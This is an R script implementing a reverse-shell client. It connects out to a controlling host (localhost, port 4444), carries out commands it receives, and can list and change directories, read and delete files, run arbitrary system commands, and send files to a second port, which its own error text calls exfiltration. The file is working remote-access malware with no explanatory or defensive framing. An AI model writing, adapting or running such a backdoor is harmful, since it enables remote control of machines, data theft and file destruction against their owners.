client <- function(host, port, secondaryPort=5472) {
  socket <- socketConnection(host=host, port=port, server=FALSE, blocking=TRUE, encoding="utf-8", timeout=300, open="r+")

  #Ensures that the socket gets closed silently, even if program fails
  on.exit(tryCatch(close(socket), error=function(e){}, warning=function(w){}))

  exiting <- FALSE
  toServer <- "Connected"
  while(!exiting) {

    writeLines(toServer, socket)
    rawCommand <- readLines(socket, 1)
    command <- strsplit(rawCommand, " ", fixed=TRUE)[[1]]
    if (!(is.na(command[1]))) {
      if (command[1] == "exit") {
        exiting <- TRUE
      }
      else if (command[1] == "dir" || command[1] == "ls") {
        toServer <- paste(dir(all.files = TRUE), collapse="%&%")
      }
      else if (command[1] == "pwd") {
        toServer <- getwd()
      }
      else if (command[1] == "cd") {
        toServer <- tryCatch( {
          dirname <- substring(rawCommand, 4)
          if (!dir.exists(dirname)) {
            signalCondition(simpleError("That folder does not exist"))
          }
          setwd(dirname)
        }, error=function(e) {
          return(paste("Error: ", e$message))
        })
      }
      else if (command[1] == "del" || command[1] == "rm") {
        toServer <- tryCatch( {
          start <- nchar(command[1]) + 2
          filename <- substring(rawCommand, start)
          unlink(filename)
          paste("Deleted", filename)
        }, error=function(e) {
          paste("Error: ", e$message)
        })
      }
      else if (command[1] == "cat" || command[1] == "type") {
        start <- nchar(command[1]) + 2
        filename <- substring(rawCommand, start)
        toServer <- tryCatch( {
          targetFile <- file(filename, "r", encoding="utf-8")
          paste(readLines(targetFile), collapse="%&%")
        }, error=function(e) {
          paste("Error: ", e$message)
        }, warning=function(w) {
          #Do nothing
        }, finally=function() {
          close(targetFile)
        })
      }
      else if (command[1] == "download") {
        filename <- substring(rawCommand, 10)
        abortDownload <- FALSE

        fileData <- tryCatch({
          fileSize <- as.integer(file.info(filename, extra_cols=FALSE)$size)
          #Slight overestimate to compensate for floating point rounding error.
          #File size is saved as a float in file.info.
          if (fileSize*1.01 >= 2^31) {
            signalCondition(simpleError("File too large to exfiltrate."))
          }
          targetFile <- file(filename, "rb")
          readBin(targetFile, what="raw", n=(fileSize)*1.01)
        }, error=function(e){
          abortDownload <- TRUE
          paste("Error reading file: ", e$message)
          writeLines("-1", socket)
        }, warning=function(w){
          #Do nothing
        }, finally=function(){
          close(targetFile)
        })

        if (!abortDownload) {
          writeLines(toString(fileSize), socket)
          toServer <- tryCatch({
              exfilSocket <- socketConnection(host=host, port=secondaryPort, blocking=FALSE, server=FALSE, open="wb")
              writeBin(fileData, exfilSocket, size=1)
              "Download Complete!"
          }, error=function(e){
            paste("Client error transmitting file: ", e$message)
          }, warning=function(w){
            #Do nothing
          }, finally=function(){
            close(exfilSocket)
          })
        } else { #Error message
          toServer <- fileData
        }

      }
      else if (command[1] == "upload") {

      }
      else {
        toServer <- tryCatch({
          rawValue <- paste(system2(command[1], stdout=TRUE, args=command[-1]), collapse="%&%")
        }, error= function(e) {
          paste("Error: ", e$message)
        }, warning=function(w) {
          #Do nothing
        })
      }
    }
  }
  close(socket)
  print("Socket closed")
}

client("localhost", 4444)
